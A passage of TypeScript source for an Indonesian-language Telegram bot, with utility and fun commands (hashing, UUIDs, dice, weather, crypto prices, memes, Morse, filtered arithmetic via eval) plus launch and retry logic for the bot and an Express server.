      ctx.reply(`🔐 SHA256:\n<code>${crypto.createHash('sha256').update(args).digest('hex')}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('uuid', (ctx) => {
      const reply = `<b>🆔 UUID GEN (v4)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${crypto.randomUUID()}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('flip', (ctx) => {
      ctx.reply(`🪙 Hasil lempar koin: <b>${Math.random() > 0.5 ? 'Kepala (Heads)' : 'Ekor (Tails)'}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roll', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Hasil dadu: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('weather', async (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join('');
      if(!args) return ctx.reply("Format: /weather [kota]");
      try {
        const res = await fetch(`https://wttr.in/${encodeURIComponent(args)}?format=3`);
        const text = await res.text();
        const reply = `<b>⛅ WEATHER FORECAST</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<pre>${text}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Gagal mendapat info cuaca."); }
    });

    bot.command('crypto_price', async (ctx) => {
       const args = ctx.message.text.split(' ')[1] || 'bitcoin';
       try {
         const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${args.toLowerCase()}&vs_currencies=usd,idr`);
         const data = await res.json();
         if(data[args.toLowerCase()]) {
            const reply = `<b>🪙 MARKET PRICE: ${args.toUpperCase()}</b>\n` +
                          `━━━━━━━━━━━━━━━━━━━━\n` +
                          `├ 💵 <b>USD:</b> $${data[args.toLowerCase()].usd}\n` +
                          `└ 🇮🇩 <b>IDR:</b> Rp${data[args.toLowerCase()].idr.toLocaleString('id-ID')}\n` +
                          `━━━━━━━━━━━━━━━━━━━━`;
            ctx.reply(reply, {parse_mode: 'HTML'});
         } else { ctx.reply("❌ Koin tidak ditemukan."); }
       } catch { ctx.reply("❌ Error fetch market."); }
    });

    bot.command('meme', async (ctx) => {
      try {
        const res = await fetch('https://meme-api.com/gimme');
        const data = await res.json();
        ctx.replyWithPhoto(data.url, { caption: data.title });
      } catch { ctx.reply("❌ Error get meme."); }
    });

    bot.command('joke', async (ctx) => {
      try {
        const res = await fetch('https://official-joke-api.appspot.com/random_joke');
        const data = await res.json();
        ctx.reply(`🤣 <b>${data.setup}</b>\n\n<i>${data.punchline}</i>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get joke."); }
    });

    bot.command('quote', async (ctx) => {
      try {
        const res = await fetch('https://dummyjson.com/quotes/random');
        const data = await res.json();
        ctx.reply(`💭 <i>"${data.quote}"</i>\n- <b>${data.author}</b>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get quote."); }
    });

    bot.command('fact', async (ctx) => {
      try {
        const res = await fetch('https://uselessfacts.jsph.pl/random.json?language=en');
        const data = await res.json();
        ctx.reply(`🧠 <b>Faktanya:</b>\n${data.text}`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get fact."); }
    });

    bot.command('cat', async (ctx) => {
      try {
        const res = await fetch('https://api.thecatapi.com/v1/images/search');
        const data = await res.json();
        ctx.replyWithPhoto(data[0].url);
      } catch { ctx.reply("❌ Error get cat."); }
    });

    bot.command('dog', async (ctx) => {
      try {
        const res = await fetch('https://dog.ceo/api/breeds/image/random');
        const data = await res.json();
        ctx.replyWithPhoto(data.message);
      } catch { ctx.reply("❌ Error get dog."); }
    });

    bot.command('morse', (ctx) => {
      const text = ctx.message.text.split(' ').slice(1).join(' ').toUpperCase();
      if(!text) return ctx.reply("Format: /morse [text]");
      const morseCode: Record<string, string> = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--',
        '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
        '9': '----.', '0': '-----', ' ': '/'
      };
      const resData = text.split('').map(c => morseCode[c] || c).join(' ');
      const reply = `<b>📡 MORSE ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<pre>${resData}</pre>` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('math', (ctx) => {
      const exp = ctx.message.text.split(' ').slice(1).join(' ');
      if(!exp) return ctx.reply("Format: /math [2+2*3]");
      try {
        // Safe evaluation simulation via limited eval
        if(/[^0-9+\-*/(). ]/.test(exp)) return ctx.reply("❌ Hanya support angka dan operator (+ - * / ( )).");
        // eslint-disable-next-line
        const result = eval(exp);
        ctx.reply(`🧮 <b>Hasil:</b>\n<code>${exp} = ${result}</code>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Ekspresi matematika error."); }
    });

    let retryCount = 0;
    const launchBot = async () => {
      try {
        await bot.launch({ dropPendingUpdates: true });
        console.log("Telegram bot is running");
      } catch (e: any) {
        if (e && (e.code === 409 || e.response?.error_code === 409)) {
          if (retryCount < 3) {
            retryCount++;
            console.warn(`Telegram Error 409: Conflict detected. (Mungkin bot sedang berjalan di tempat lain). Retrying in 5 seconds... (Attempt ${retryCount}/3)`);
            setTimeout(launchBot, 5000);
          } else {
            console.error("🚨 GAGAL MENJALANKAN BOT: Token bot Telegram ini sedang aktif dan di-host di tempat lain (Misalnya di Deploy Cloud Run atau komputer lokal Anda yang lain). Silakan matikan instance yang lama, atau buat bot baru di BotFather agar token tidak bentrok.");
          }
        } else {
          console.error("Failed to run Telegram Bot:", e);
        }
      }
    };
    launchBot();

    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));
  } else {
    console.log("TELEGRAM_BOT_TOKEN not provided, skipping Telegram bot setup.");
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
